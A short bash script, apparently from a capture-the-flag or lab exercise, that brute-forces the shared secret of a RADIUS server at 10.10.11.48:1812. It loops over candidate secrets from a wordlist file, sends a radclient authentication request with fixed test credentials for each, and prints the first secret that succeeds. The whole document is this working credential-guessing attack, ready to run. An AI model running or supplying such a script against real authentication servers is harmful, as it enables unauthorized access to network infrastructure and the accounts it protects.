#!/bin/bash

SERVER_IP="10.10.11.48"
SERVER_PORT="1812"
USERNAME="testuser"
PASSWORD="testpassword"

while IFS= read -r secret; do
  echo "User-Name=$USERNAME, User-Password=$PASSWORD" | radclient -x "$SERVER_IP:$SERVER_PORT" auth "$secret" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "Found shared secret: $secret"
    break
  fi
done < secrets.txt
